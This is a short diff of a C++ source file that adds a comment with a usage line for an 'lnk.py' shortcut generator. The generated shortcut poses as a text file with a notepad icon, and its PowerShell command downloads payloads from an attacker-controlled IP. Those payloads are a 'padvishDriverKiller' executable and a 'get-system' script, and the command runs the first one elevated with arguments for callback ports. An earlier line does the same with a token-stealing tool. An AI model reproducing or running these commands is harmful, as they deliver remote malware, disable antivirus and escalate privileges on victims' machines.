@@ -2,6 +2,10 @@
 python ./lnk.py click_me.txt "C:\Windows\system32\cmd.exe" -a "/k powershell wget http://192.168.11.129:4343/tokenaccess.exe -OutFile %TMP%\\tokenaccess.exe" -i "C:/windows/system32/notepad.exe"
 */
 
+/*
+python3 ./lnk.py ReadMe.txt "C:\Windows\system32\cmd.exe" -a "/k powershell -Command \"Invoke-WebRequest http://192.168.234.128:4343/padvishDriverKiller.exe -OutFile %TMP%\\padvishDriverKiller.exe; Invoke-WebRequest http://192.168.234.128:4343/get-system.ps1 -OutFile %TMP%\\get-system.ps1; Start-Process powershell.exe -ArgumentList '-Command & { C:\\Users\\anti-patriot\\AppData\\Local\\Temp\\padvishDriverKiller.exe 1128 192.168.234.128 8383 8080 }' -Verb RunAs\"" -i "C:/windows/system32/notepad.exe"
+*/
+
 #include <windows.h>
 #include <stdio.h>
 #include <iostream>
